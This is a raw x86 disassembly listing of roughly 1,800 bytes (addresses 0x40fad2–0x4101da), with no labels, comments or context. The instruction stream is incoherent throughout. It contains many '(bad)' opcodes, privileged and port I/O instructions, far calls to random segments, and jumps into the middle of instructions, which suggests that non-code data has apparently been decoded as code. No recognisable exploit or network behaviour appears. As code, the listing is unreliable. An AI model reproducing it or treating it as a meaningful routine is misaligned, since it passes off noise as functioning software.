  40fad2:	fistp  WORD PTR [esi]
  40fad4:	inc    ebp
  40fad5:	loope  0x40fb18
  40fad7:	fisubr DWORD PTR [ebp-0x41d7dabc]
  40fadd:	out    0x49,eax
  40fadf:	or     dl,cl
  40fae1:	or     eax,0x85f73db4
  40fae6:	(bad)  
  40fae7:	lahf   
  40fae8:	xchg   ebp,eax
  40fae9:	cmp    eax,0x8e7646a8
  40faee:	push   edi
  40faef:	js     0x40fa8a
  40faf1:	sbb    ebp,DWORD PTR [esi+0xe]
  40faf4:	jo     0x40fb20
  40faf6:	jo     0x40fadf
  40faf8:	clc    
  40faf9:	mov    DWORD PTR [edi],0x510e58ce
  40faff:	outs   dx,BYTE PTR ds:[esi]
  40fb00:	inc    ebx
  40fb01:	out    dx,al
  40fb02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb03:	int3   
  40fb04:	jle    0x40fafa
  40fb06:	arpl   WORD PTR [ecx+0x30],bp
  40fb09:	mov    ch,0x23
  40fb0b:	popa   
  40fb0c:	stos   DWORD PTR es:[edi],eax
  40fb0d:	jg     0x40fb50
  40fb0f:	stc    
  40fb10:	test   BYTE PTR [ebx+0x79b06c62],bh
  40fb16:	and    bh,ah
  40fb18:	or     DWORD PTR [ebx],edi
  40fb1a:	clc    
  40fb1b:	mov    ch,0x76
  40fb1d:	dec    esp
  40fb1e:	jo     0x40fb0c
  40fb20:	cmp    al,0x5e
  40fb22:	xchg   esi,eax
  40fb23:	xchg   bl,al
  40fb25:	es push ds
  40fb27:	jp     0x40fb9e
  40fb29:	pusha  
  40fb2a:	adc    BYTE PTR [eax+0x7f],ah
  40fb2d:	outs   dx,DWORD PTR ds:[esi]
  40fb2e:	icebp  
  40fb2f:	adc    al,0xe5
  40fb31:	xchg   cl,dh
  40fb33:	lock pop ebp
  40fb35:	call   0x8d62b73b
  40fb3a:	xchg   edi,eax
  40fb3b:	jg     0x40fb1f
  40fb3d:	faddp  st(7),st
  40fb3f:	push   ebp
  40fb40:	call   0x6a33:0xf2567346
  40fb47:	js     0x40fb46
  40fb49:	popf   
  40fb4a:	add    ah,BYTE PTR [edx+eiz*8]
  40fb4d:	mov    edi,DWORD PTR [edx+ecx*4+0x1a290946]
  40fb54:	inc    ebp
  40fb55:	aas    
  40fb56:	cwde   
  40fb57:	in     eax,0xbc
  40fb59:	inc    ecx
  40fb5a:	cmc    
  40fb5b:	push   eax
  40fb5c:	fiadd  DWORD PTR [esp+edi*4-0x2b2cff3a]
  40fb63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb64:	jns    0x40fbcf
  40fb66:	add    al,0x93
  40fb68:	mov    ebx,0x335dcb0a
  40fb6d:	gs jp  0x40fbd6
  40fb70:	bound  eax,QWORD PTR [ebp+0x588231f9]
  40fb76:	cmp    DWORD PTR [esi+eiz*4-0x53f09a77],0x2c
  40fb7e:	cwde   
  40fb7f:	fsub   DWORD PTR [esi-0x35]
  40fb82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb83:	out    dx,al
  40fb84:	sbb    eax,0xe738f05c
  40fb89:	mov    esp,0xa8d52c53
  40fb8e:	sub    DWORD PTR [ecx-0x1854f22f],esp
  40fb94:	popa   
  40fb95:	ret    0x217f
  40fb98:	nop
  40fb99:	dec    ebp
  40fb9a:	xchg   edi,eax
  40fb9b:	mov    esp,DWORD PTR ds:0xf58c14cb
  40fba1:	xor    eax,DWORD PTR [ebx]
  40fba3:	sub    DWORD PTR [ebp-0x714598fc],ecx
  40fba9:	mov    es,ebx
  40fbab:	dec    ebx
  40fbac:	pop    ebp
  40fbad:	push   edx
  40fbae:	add    al,0xa2
  40fbb0:	mov    ah,0x9d
  40fbb2:	adc    cl,BYTE PTR ds:0x7150c2b9
  40fbb8:	out    dx,eax
  40fbb9:	std    
  40fbba:	mov    BYTE PTR [ebx],ah
  40fbbc:	mov    ah,0x7f
  40fbbe:	mov    ah,bl
  40fbc0:	in     al,0xa9
  40fbc2:	stos   BYTE PTR es:[edi],al
  40fbc3:	in     eax,dx
  40fbc4:	bound  edi,QWORD PTR ss:0x26cdfdf1
  40fbcb:	jae    0x40fc3a
  40fbcd:	push   ebx
  40fbce:	adc    dl,BYTE PTR [ebp-0x7f]
  40fbd1:	mov    BYTE PTR [esi],dl
  40fbd3:	sbb    edx,DWORD PTR [edx+eiz*4+0x28]
  40fbd7:	add    dl,BYTE PTR [edi-0x5edab71d]
  40fbdd:	aaa    
  40fbde:	pop    edx
  40fbdf:	push   esp
  40fbe0:	mov    cl,0x25
  40fbe2:	ss cli 
  40fbe4:	sar    DWORD PTR [edi],0x6c
  40fbe7:	dec    edx
  40fbe8:	int3   
  40fbe9:	mov    cl,0x5d
  40fbeb:	(bad)  
  40fbec:	push   ss
  40fbed:	mov    eax,es
  40fbef:	pop    edi
  40fbf0:	pop    ss
  40fbf1:	imul   eax,DWORD PTR [edx],0x15
  40fbf4:	jle    0x40fbee
  40fbf6:	xor    eax,0x84c46cf6
  40fbfb:	fisubr DWORD PTR [bx+si-0x200d]
  40fc00:	int3   
  40fc01:	stos   DWORD PTR es:[edi],eax
  40fc02:	push   eax
  40fc03:	int    0xe
  40fc05:	into   
  40fc06:	adc    BYTE PTR [esi+ecx*1+0x7d],ah
  40fc0a:	cs aas 
  40fc0c:	push   ebx
  40fc0d:	cmp    esp,DWORD PTR ds:0xa15cce80
  40fc13:	add    eax,0xdfebeeb9
  40fc18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc19:	stc    
  40fc1a:	mov    edx,0x1835b450
  40fc1f:	sbb    bl,BYTE PTR [edi-0x54]
  40fc22:	das    
  40fc23:	pop    esi
  40fc24:	idiv   DWORD PTR [ecx+0x7f]
  40fc27:	in     al,dx
  40fc28:	xchg   ecx,eax
  40fc29:	push   ebp
  40fc2a:	and    al,BYTE PTR [edi]
  40fc2c:	fnstenv [eax-0x3f]
  40fc2f:	sub    al,0x64
  40fc31:	push   ebx
  40fc32:	push   cs
  40fc33:	mov    BYTE PTR [ebp-0x45],dl
  40fc36:	fcomp  DWORD PTR [edi]
  40fc38:	mov    bl,0x6e
  40fc3a:	cmp    eax,0x2c21e761
  40fc3f:	push   edx
  40fc40:	push   ds
  40fc41:	popa   
  40fc42:	add    edx,DWORD PTR [edi+0x64]
  40fc45:	les    ecx,FWORD PTR [edx+0x62]
  40fc48:	and    dl,BYTE PTR ds:0x787e7cad
  40fc4e:	in     eax,0x27
  40fc50:	adc    eax,0x61d8ee0a
  40fc55:	mov    WORD PTR [ebp+0x4],gs
  40fc58:	dec    ebp
  40fc59:	adc    BYTE PTR [esi-0x51],al
  40fc5c:	pop    ebx
  40fc5d:	add    BYTE PTR [edx],0x9f
  40fc60:	xor    DWORD PTR [edx],eax
  40fc62:	add    BYTE PTR [esi+0x53],ch
  40fc65:	cmp    eax,0xcee2485d
  40fc6a:	repz cmp DWORD PTR [ebp+0x20],esp
  40fc6e:	dec    ebp
  40fc6f:	cmc    
  40fc70:	sub    BYTE PTR [esi+0x726f240],bh
  40fc76:	sub    eax,0x7cde60eb
  40fc7b:	rcr    dl,0x69
  40fc7e:	sbb    edi,DWORD PTR [edi-0x2af5c7da]
  40fc84:	dec    eax
  40fc85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc86:	jge    0x40fc2b
  40fc88:	ins    BYTE PTR es:[edi],dx
  40fc89:	outs   dx,DWORD PTR ds:[esi]
  40fc8a:	aam    0x52
  40fc8c:	mov    cl,BYTE PTR [edx+0x6b]
  40fc8f:	dec    edx
  40fc90:	test   eax,0x911fb92c
  40fc95:	fld    DWORD PTR [esi]
  40fc97:	cmp    cl,al
  40fc99:	sub    eax,0x132a110a
  40fc9e:	das    
  40fc9f:	ss xchg edx,eax
  40fca1:	fwait
  40fca2:	outs   dx,BYTE PTR ds:[esi]
  40fca3:	cmc    
  40fca4:	pop    edx
  40fca5:	aas    
  40fca6:	and    edx,ebp
  40fca8:	popa   
  40fca9:	ss fadd st(6),st
  40fcac:	or     BYTE PTR [esi*8+0x33b224d6],ch
  40fcb3:	cdq    
  40fcb4:	fwait
  40fcb5:	(bad)  
  40fcb6:	rol    ch,1
  40fcb8:	pop    ebx
  40fcb9:	mov    bl,0x58
  40fcbb:	ret    0x13d
  40fcbe:	push   esp
  40fcbf:	xor    bl,dl
  40fcc1:	dec    edi
  40fcc2:	mov    ds:0xdf9cd380,al
  40fcc7:	leave  
  40fcc8:	icebp  
  40fcc9:	sbb    eax,0x604fea03
  40fcce:	xchg   ebx,eax
  40fccf:	adc    bl,al
  40fcd1:	push   es
  40fcd2:	sti    
  40fcd3:	or     ah,BYTE PTR [ebx+0x5f]
  40fcd6:	repnz mov dh,0xdd
  40fcd9:	and    edi,DWORD PTR [ecx-0x45eca3c6]
  40fcdf:	daa    
  40fce0:	mov    ecx,0xc10b6823
  40fce5:	ja     0x40fd3a
  40fce7:	enter  0x6937,0xda
  40fceb:	aam    0x62
  40fced:	ja     0x40fc74
  40fcef:	sub    DWORD PTR [esi+0x27],edx
  40fcf2:	xchg   ebp,eax
  40fcf3:	int    0x61
  40fcf5:	in     eax,dx
  40fcf6:	loope  0x40fcdc
  40fcf8:	out    0xc1,eax
  40fcfa:	lock xor eax,0x4692216e
  40fd00:	arpl   di,di
  40fd02:	inc    ebp
  40fd03:	shl    BYTE PTR [edx],0xac
  40fd06:	jns    0x40fd7a
  40fd08:	fmul   DWORD PTR [edx+ecx*2-0x52e8a8ce]
  40fd0f:	stos   BYTE PTR es:[edi],al
  40fd10:	(bad)  
  40fd11:	pop    edx
  40fd12:	dec    esp
  40fd13:	jmp    0x520f:0x9a812085
  40fd1a:	mov    BYTE PTR [ebp-0x80],al
  40fd1d:	loopne 0x40fcfb
  40fd1f:	nop
  40fd20:	lods   al,BYTE PTR ds:[esi]
  40fd21:	shl    DWORD PTR [eax-0x10],cl
  40fd24:	mov    BYTE PTR [ecx],dl
  40fd26:	push   ebx
  40fd27:	sub    edx,ecx
  40fd29:	out    0x51,al
  40fd2b:	push   ecx
  40fd2c:	ss icebp 
  40fd2e:	mov    ebp,0xca4edb91
  40fd33:	inc    esp
  40fd34:	loop   0x40fd99
  40fd36:	xlat   BYTE PTR ds:[ebx]
  40fd37:	xor    ebx,DWORD PTR [edi]
  40fd39:	or     DWORD PTR [eax-0x22],edi
  40fd3c:	mov    eax,ds:0x23d240e9
  40fd41:	ret    
  40fd42:	sahf   
  40fd43:	sub    DWORD PTR [edi+0x12],edx
  40fd46:	xor    eax,esp
  40fd48:	popa   
  40fd49:	popf   
  40fd4a:	dec    esi
  40fd4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd4c:	push   0xffffffef
  40fd4e:	iret   
  40fd4f:	mov    bl,BYTE PTR [edi]
  40fd51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd52:	jmp    0x40fd27
  40fd54:	pusha  
  40fd55:	jg     0x40fd0c
  40fd57:	jb     0x40fd61
  40fd59:	lock leave 
  40fd5b:	sub    bh,BYTE PTR [ecx+0x4c]
  40fd5e:	pop    esp
  40fd5f:	cmc    
  40fd60:	cmp    DWORD PTR [ecx-0x47a6d12e],ecx
  40fd66:	and    edx,DWORD PTR [ecx+0x6]
  40fd69:	ror    BYTE PTR [eax],cl
  40fd6b:	mov    bh,0x8a
  40fd6d:	into   
  40fd6e:	or     BYTE PTR [edi],bl
  40fd70:	cmp    ch,ah
  40fd72:	jp     0x40fd15
  40fd74:	mov    ch,0x9
  40fd76:	and    eax,0x59ca0173
  40fd7b:	retf   
  40fd7c:	icebp  
  40fd7d:	inc    ecx
  40fd7e:	test   BYTE PTR ds:0x1a4e40ca,al
  40fd84:	lea    ecx,[ecx+0x6d]
  40fd87:	adc    eax,0xc5efa75c
  40fd8c:	icebp  
  40fd8d:	or     eax,0x3256f4a9
  40fd92:	stos   BYTE PTR es:[edi],al
  40fd93:	jns    0x40fd6d
  40fd95:	or     ebx,DWORD PTR [edx]
  40fd97:	fwait
  40fd98:	(bad)
  40fd9b:	sub    esi,DWORD PTR [edx+eiz*8+0x7fc8a5e9]
  40fda2:	scas   eax,DWORD PTR es:[edi]
  40fda3:	enter  0x6c2c,0xe4
  40fda7:	jae    0x40fdcb
  40fda9:	test   ch,ch
  40fdab:	or     al,0xe7
  40fdad:	(bad)  
  40fdae:	xchg   edi,eax
  40fdaf:	iret   
  40fdb0:	dec    eax
  40fdb1:	pop    ebp
  40fdb2:	dec    esp
  40fdb3:	xchg   edx,eax
  40fdb4:	sbb    eax,0x4a99bef
  40fdb9:	inc    ebx
  40fdba:	in     al,dx
  40fdbb:	pop    ebp
  40fdbc:	pop    eax
  40fdbd:	sub    BYTE PTR [ebx],dl
  40fdbf:	xlat   BYTE PTR ds:[ebx]
  40fdc0:	aas    
  40fdc1:	push   eax
  40fdc2:	inc    edx
  40fdc3:	inc    esi
  40fdc4:	mov    cl,0xf0
  40fdc6:	fdiv   QWORD PTR [esi+esi*4+0x57]
  40fdca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdcb:	xlat   BYTE PTR ds:[ebx]
  40fdcc:	mov    ecx,0x7d5bcb20
  40fdd1:	push   0x1c2a059b
  40fdd6:	lods   eax,DWORD PTR ds:[esi]
  40fdd7:	lahf   
  40fdd8:	xchg   ebx,eax
  40fdd9:	ss adc eax,0x10c9b56d
  40fddf:	lods   eax,DWORD PTR ds:[esi]
  40fde0:	ficom  DWORD PTR [ebx]
  40fde2:	setnp  BYTE PTR [eax+eiz*8-0x7375af38]
  40fdea:	xor    DWORD PTR [ecx+0x4c2c131c],eax
  40fdf0:	aad    0xe5
  40fdf2:	mov    dl,0x87
  40fdf4:	jecxz  0x40fd9d
  40fdf6:	lods   al,BYTE PTR ds:[esi]
  40fdf7:	jg     0x40fd85
  40fdf9:	mov    bl,0xa2
  40fdfb:	scas   al,BYTE PTR es:[edi]
  40fdfc:	fisubr DWORD PTR [ecx]
  40fdfe:	sub    DWORD PTR [eax+0x6b],eax
  40fe01:	pop    ss
  40fe02:	stos   DWORD PTR es:[edi],eax
  40fe03:	enter  0x65d6,0xf8
  40fe07:	inc    esp
  40fe08:	pop    ebx
  40fe09:	outs   dx,BYTE PTR ds:[esi]
  40fe0a:	out    dx,eax
  40fe0b:	xchg   edx,eax
  40fe0c:	in     al,0xb4
  40fe0e:	mov    dh,0xcc
  40fe10:	mov    BYTE PTR [esi],dl
  40fe12:	mov    bh,0xf7
  40fe14:	mov    esi,0x8e442673
  40fe19:	dec    ebx
  40fe1a:	sbb    eax,0xf2964f8b
  40fe1f:	add    al,0xb2
  40fe21:	mov    eax,DWORD PTR [eax+ecx*4+0x74bdeb2c]
  40fe28:	clc    
  40fe29:	sub    al,0x37
  40fe2b:	cmc    
  40fe2c:	mov    eax,ds:0xa2718017
  40fe31:	sbb    cl,ch
  40fe33:	push   esi
  40fe34:	push   ds
  40fe35:	mov    DWORD PTR [ebx-0x7105a3c3],ecx
  40fe3b:	sar    BYTE PTR [esi-0x4c],0x9f
  40fe3f:	adc    bh,bh
  40fe41:	inc    edx
  40fe42:	pop    edi
  40fe43:	ds mov ch,0xa8
  40fe46:	in     eax,0x93
  40fe48:	push   0xb8f0732c
  40fe4d:	mov    edi,ecx
  40fe4f:	ins    DWORD PTR es:[edi],dx
  40fe50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe51:	sub    ecx,DWORD PTR [edi-0x31]
  40fe54:	(bad)  
  40fe56:	jmp    DWORD PTR [edi-0x6f]
  40fe59:	retf   0xe5ad
  40fe5c:	mov    WORD PTR [ebx+0x7a],gs
  40fe5f:	fcmovne st,st(1)
  40fe61:	fistp  WORD PTR [esp+ecx*1+0x75daa6d2]
  40fe68:	push   edx
  40fe69:	loope  0x40fdfe
  40fe6b:	outs   dx,DWORD PTR ds:[esi]
  40fe6c:	cwde   
  40fe6d:	std    
  40fe6e:	push   eax
  40fe6f:	pushf  
  40fe70:	mov    edx,0x20554164
  40fe75:	adc    dl,BYTE PTR ds:0xc5fadf43
  40fe7b:	lahf   
  40fe7c:	gs pusha 
  40fe7e:	or     ah,dh
  40fe80:	les    edx,FWORD PTR [eax]
  40fe82:	lea    eax,[edi+0x59]
  40fe85:	outs   dx,DWORD PTR ds:[esi]
  40fe86:	in     eax,0xb9
  40fe88:	jecxz  0x40fe78
  40fe8a:	dec    eax
  40fe8b:	outs   dx,DWORD PTR ds:[esi]
  40fe8c:	xchg   BYTE PTR [ebx],ah
  40fe8e:	dec    edx
  40fe8f:	leave  
  40fe90:	test   edx,edi
  40fe92:	imul   ebp,DWORD PTR [esi],0xe28f474a
  40fe98:	and    BYTE PTR [ecx+ebp*8-0x79],bh
  40fe9c:	add    dh,BYTE PTR [ebx-0x1a]
  40fe9f:	outs   dx,BYTE PTR ds:[esi]
  40fea0:	jae    0x40fe87
  40fea2:	push   edi
  40fea3:	mov    eax,ds:0x565867b2
  40fea8:	ret    
  40fea9:	cwde   
  40feaa:	popf   
  40feab:	call   0x8d39:0xbc949c35
  40feb2:	mov    ds:0xdf96d2e5,al
  40feb7:	cmp    DWORD PTR [ecx-0x55],esi
  40feba:	mov    dh,0x53
  40febc:	push   ecx
  40febd:	xor    al,0x4a
  40febf:	stc    
  40fec0:	stos   DWORD PTR es:[edi],eax
  40fec1:	mov    ebx,0xd01558dc
  40fec6:	jb     0x40fe8b
  40fec8:	icebp  
  40fec9:	enter  0xe181,0x21
  40fecd:	in     eax,0xbd
  40fecf:	lahf   
  40fed0:	push   0xb568daea
  40fed5:	jge    0x40fe6c
  40fed7:	outs   dx,DWORD PTR ds:[esi]
  40fed8:	inc    esp
  40fed9:	std    
  40feda:	or     eax,0x903842c5
  40fedf:	jne    0x40feb3
  40fee1:	ficomp WORD PTR [eax+0x39099500]
  40fee7:	xchg   ebx,eax
  40fee8:	sbb    bl,BYTE PTR [ebp+0x28b6eb86]
  40feee:	sbb    ch,al
  40fef0:	pop    ss
  40fef1:	repnz adc DWORD PTR [edx+0xa],esp
  40fef5:	mov    ebp,DWORD PTR [esi]
  40fef7:	pop    edi
  40fef8:	dec    edx
  40fef9:	add    DWORD PTR [edx],ecx
  40fefb:	adc    BYTE PTR [ecx-0x735d7600],0x77
  40ff02:	cmc    
  40ff03:	mov    eax,ds:0xd28c9f84
  40ff08:	mov    edx,0x5a3a58d
  40ff0d:	xchg   DWORD PTR [edi-0x71],edi
  40ff10:	sbb    ecx,DWORD PTR [eax+0x31]
  40ff13:	lds    ebx,FWORD PTR [ebx+0x6f]
  40ff16:	or     al,0x62
  40ff18:	stos   BYTE PTR es:[edi],al
  40ff19:	cmp    BYTE PTR [ecx],al
  40ff1b:	pop    ss
  40ff1c:	or     DWORD PTR [esi+0x28],0xffffffa8
  40ff20:	popf   
  40ff21:	push   eax
  40ff22:	inc    ecx
  40ff23:	mov    edx,DWORD PTR [ecx+edi*4+0x67d592ff]
  40ff2a:	hlt    
  40ff2b:	mov    ebx,0xcc2d40a0
  40ff30:	rol    DWORD PTR [ecx-0x80],0xd1
  40ff34:	data16 arpl WORD PTR [ecx-0x54154c0b],sp
  40ff3b:	fdiv   DWORD PTR [ebp-0x18]
  40ff3e:	out    dx,eax
  40ff3f:	mov    ds:0xdea76493,al
  40ff44:	stos   DWORD PTR es:[edi],eax
  40ff45:	aaa    
  40ff46:	push   esi
  40ff47:	outs   dx,DWORD PTR ds:[esi]
  40ff48:	test   DWORD PTR [ebx+0x5b],ebx
  40ff4b:	daa    
  40ff4c:	add    esp,ebp
  40ff4e:	pop    esp
  40ff4f:	adc    BYTE PTR [edx-0x14],0x4e
  40ff53:	in     al,dx
  40ff54:	retf   0x5efd
  40ff57:	or     al,0x88
  40ff59:	loope  0x40fedb
  40ff5b:	leave  
  40ff5c:	stos   BYTE PTR es:[edi],al
  40ff5d:	mov    cl,0x87
  40ff5f:	cmp    BYTE PTR [ecx],cl
  40ff61:	push   0x33
  40ff63:	jmp    0x6f9:0xe4b4e83e
  40ff6a:	adc    eax,0x9f733b45
  40ff6f:	mov    ds:0x4bb9a79e,eax
  40ff74:	jecxz  0x40ffbe
  40ff76:	pop    eax
  40ff77:	sbb    edi,DWORD PTR [edi-0x581345cf]
  40ff7d:	pop    ss
  40ff7e:	xchg   edx,eax
  40ff7f:	pusha  
  40ff80:	xchg   ecx,eax
  40ff81:	gs dec edx
  40ff83:	in     al,dx
  40ff84:	daa    
  40ff85:	push   eax
  40ff86:	(bad)  
  40ff87:	mul    DWORD PTR [esi+edx*4-0x4a]
  40ff8b:	add    eax,0x15170ca9
  40ff90:	jmp    0xa1fceed7
  40ff95:	int    0x7a
  40ff97:	lahf   
  40ff98:	nop
  40ff99:	push   edi
  40ff9a:	push   DWORD PTR gs:[ebx+0x7efd4333]
  40ffa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffa2:	adc    eax,esi
  40ffa4:	lods   eax,DWORD PTR ds:[esi]
  40ffa5:	mov    cl,0xe8
  40ffa7:	xchg   edi,eax
  40ffa8:	and    dl,BYTE PTR [ecx]
  40ffaa:	call   0xe730:0x601c3f4a
  40ffb1:	pop    ebx
  40ffb2:	jns    0x40ffa4
  40ffb4:	push   ecx
  40ffb5:	sub    edi,DWORD PTR [edi]
  40ffb7:	mov    esi,0xcfcf87fd
  40ffbc:	mov    esi,0x45867ac8
  40ffc1:	lock and bh,BYTE PTR [eax]
  40ffc4:	outs   dx,DWORD PTR ds:[esi]
  40ffc5:	dec    ebp
  40ffc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffc7:	sbb    BYTE PTR [edi-0xfb605fb],dh
  40ffcd:	sub    DWORD PTR [ebp+0x23],eax
  40ffd0:	mov    dh,0xb2
  40ffd2:	pushf  
  40ffd3:	rcr    BYTE PTR [edx+ecx*2],cl
  40ffd6:	enter  0x6ea6,0xef
  40ffda:	outs   dx,BYTE PTR ds:[esi]
  40ffdb:	dec    ecx
  40ffdc:	pop    ebp
  40ffdd:	xor    eax,0x35eb5d4b
  40ffe2:	bound  ebx,QWORD PTR [edx-0x14]
  40ffe5:	call   0x196b:0x890acce8
  40ffec:	test   BYTE PTR [ebp+ebx*8-0x1a],0xb6
  40fff1:	and    BYTE PTR [eax],bl
  40fff3:	mov    eax,0xf21fc214
  40fff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fff9:	add    ecx,esi
  40fffb:	cmp    esi,esp
  40fffd:	inc    ebx
  40fffe:	(bad)  
  40ffff:	adc    DWORD PTR [esp+esi*2+0x3d37e480],ecx
  410006:	push   ecx
  410007:	lock je 0x410023
  41000a:	ja     0x410006
  41000c:	int3   
  41000d:	cli    
  41000e:	jmp    DWORD PTR [edx+eiz*1]
  410011:	mov    ch,0xc1
  410013:	shr    DWORD PTR [esi-0x71],1
  410016:	outs   dx,BYTE PTR ds:[esi]
  410017:	into   
  410018:	stos   DWORD PTR es:[edi],eax
  410019:	push   ss
  41001a:	sub    DWORD PTR [ecx-0x9],0xffffff9c
  41001e:	inc    esp
  41001f:	inc    ebx
  410020:	outs   dx,BYTE PTR ds:[esi]
  410021:	inc    edx
  410022:	xchg   ecx,eax
  410023:	scas   eax,DWORD PTR es:[edi]
  410024:	cmc    
  410025:	or     ebp,edi
  410027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410028:	cmp    eax,0x6fe0855e
  41002d:	mov    bl,0xfd
  41002f:	xchg   ebx,eax
  410030:	pop    ebx
  410031:	jae    0x410050
  410033:	jno    0x410079
  410035:	push   esp
  410036:	or     edx,DWORD PTR [ebp+0x6bbefddb]
  41003c:	inc    ebp
  41003d:	es mov ebx,0x7bdf4116
  410043:	xor    DWORD PTR [edi],eax
  410045:	and    ch,BYTE PTR [esi+ebp*8-0x6cc987f]
  41004c:	gs mov edx,0x8f7f857
  410052:	(bad)  
  410053:	aas    
  410054:	cmp    DWORD PTR [edx+eax*8+0x4d7313a],esp
  41005b:	loop   0x4100c4
  41005d:	mov    ebx,0x84076b9d
  410062:	add    dl,BYTE PTR [edi]
  410064:	js     0x4100cb
  410066:	mov    bh,0x56
  410068:	std    
  410069:	stos   BYTE PTR es:[edi],al
  41006a:	iret   
  41006b:	out    0x3b,eax
  41006d:	call   0x77869887
  410072:	shr    ebp,cl
  410074:	ret    
  410075:	data16 in al,dx
  410077:	rcr    edx,1
  410079:	leave  
  41007a:	mov    ch,0x32
  41007c:	outs   dx,BYTE PTR ds:[esi]
  41007e:	shl    DWORD PTR [ecx+0x2f38053c],0x70
  410085:	xor    ebp,ebp
  410087:	mov    ch,0x49
  410089:	mov    ch,0x9c
  41008b:	pop    ebx
  41008c:	dec    ecx
  41008d:	mov    ebp,0x3ba8f89e
  410092:	nop
  410093:	rcr    DWORD PTR [ebx+0x7e],1
  410096:	sub    eax,0xdb809694
  41009b:	lods   al,BYTE PTR ds:[esi]
  41009c:	pop    ebx
  41009d:	sbb    ebp,edi
  41009f:	mov    edx,0xfef8672f
  4100a4:	(bad)  
  4100a5:	dec    eax
  4100a6:	call   0xfa6930e0
  4100ab:	test   BYTE PTR [edi+0x1f],al
  4100ae:	call   0x9c120367
  4100b3:	mov    al,BYTE PTR [eax-0x2a]
  4100b6:	sti    
  4100b7:	js     0x4100a7
  4100b9:	out    0xa3,eax
  4100bb:	pusha  
  4100bc:	dec    ebx
  4100bd:	ret    0xd913
  4100c0:	jge    0x410104
  4100c2:	push   esi
  4100c3:	jnp    0x4100f7
  4100c5:	daa    
  4100c6:	xor    BYTE PTR [ebx+0x288dd308],dh
  4100cc:	push   cs
  4100cd:	inc    esp
  4100ce:	pop    ds
  4100cf:	pusha  
  4100d0:	jmp    0x3ff329bf
  4100d5:	adc    dl,BYTE PTR [edi+0x76]
  4100d8:	mov    ecx,0x135adb97
  4100dd:	jmp    0x410093
  4100df:	xchg   ebx,eax
  4100e0:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100e2:	fiadd  WORD PTR [ebp+esi*1-0x436065b2]
  4100e9:	in     eax,dx
  4100ea:	xor    dl,cl
  4100ec:	add    al,0x2c
  4100ee:	call   DWORD PTR [esi-0x30362d1d]
  4100f4:	dec    esi
  4100f5:	out    dx,al
  4100f6:	lods   eax,DWORD PTR ds:[esi]
  4100f7:	fwait
  4100f8:	mov    BYTE PTR [ecx],al
  4100fa:	jb     0x410128
  4100fc:	cmp    esi,DWORD PTR [ebp+0xf2595d3]
  410102:	and    eax,0x5415488f
  410107:	out    0x59,eax
  410109:	repz pusha 
  41010b:	arpl   WORD PTR [ecx],bx
  41010d:	xlat   BYTE PTR ds:[ebx]
  41010e:	add    eax,0xd0cdaac
  410113:	jmp    0x41009c
  410115:	or     eax,0x93a837f8
  41011a:	pusha  
  41011b:	(bad)  
  41011c:	mov    ds:0x1e8c26d5,eax
  410121:	loope  0x4100ac
  410123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410124:	fild   QWORD PTR [ecx-0x2a]
  410127:	out    dx,al
  410128:	pop    esp
  410129:	lds    edx,FWORD PTR [edi]
  41012b:	or     dl,BYTE PTR [eax-0x31]
  41012e:	dec    ebp
  41012f:	pop    esi
  410130:	std    
  410131:	lock adc al,0xd2
  410134:	jno    0x4100cf
  410136:	ins    DWORD PTR es:[edi],dx
  410137:	je     0x41014d
  410139:	dec    esi
  41013a:	fwait
  41013b:	cs mov ebx,0x1d6c8711
  410141:	cmp    eax,0x37b2a887
  410146:	sbb    al,0x61
  410148:	cmp    DWORD PTR [esi],edx
  41014a:	adc    bh,al
  41014c:	push   esp
  41014d:	ret    0xa5d2
  410150:	lods   al,BYTE PTR ds:[esi]
  410151:	jne    0x4101a5
  410153:	push   es
  410154:	popa   
  410155:	mov    al,ds:0xd7317e6d
  41015a:	cmp    DWORD PTR [eax],esp
  41015c:	bound  ecx,QWORD PTR [edi+0x6a]
  41015f:	outs   dx,BYTE PTR gs:[esi]
  410161:	shl    DWORD PTR [esp+edi*2+0x5fd7992e],1
  410168:	outs   dx,DWORD PTR ds:[esi]
  410169:	pop    esp
  41016a:	mov    al,0xb1
  41016c:	sbb    al,0xca
  41016e:	call   0x9127e40
  410173:	pop    ebx
  410174:	push   0x3764d902
  410179:	fld    st(4)
  41017b:	loop   0x410196
  41017d:	(bad)  
  41017e:	and    cl,BYTE PTR [ebp-0x32e85ff9]
  410184:	inc    ecx
  410185:	popaw  
  410187:	xchg   eax,esp
  410189:	mov    DWORD PTR [esp+eax*1-0x464ffcd6],ebp
  410190:	pop    ss
  410191:	ret    
  410192:	call   0x264cfa3f
  410197:	fdivr  DWORD PTR [edx+0x129c68fa]
  41019d:	and    esi,edi
  41019f:	pushf  
  4101a0:	stos   BYTE PTR es:[edi],al
  4101a1:	mov    DWORD PTR [esp+esi*4],esi
  4101a4:	inc    ebp
  4101a5:	pop    edx
  4101a6:	test   ebx,esp
  4101a8:	mov    BYTE PTR [eax-0x13],ah
  4101ab:	fstp   DWORD PTR [edi]
  4101ad:	mov    ebp,DWORD PTR [esp+ecx*1]
  4101b0:	add    bl,dh
  4101b2:	retf   
  4101b3:	mov    ds:0xdbee892a,al
  4101b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101b9:	iret   
  4101ba:	mov    ds:0x1d0446b3,al
  4101bf:	push   edi
  4101c0:	or     ebp,DWORD PTR [si-0x4b37]
  4101c5:	ds pop edi
  4101c7:	call   0x308f:0x5d53f9bf
  4101ce:	data16 out 0xa3,al
  4101d1:	push   ss
  4101d2:	fnsave [edi-0x762bb445]
  4101d8:	push   0xffffff97
  4101da:	mov    DWORD PTR [edi-0x2c3ebc4c],0xfc9994f7
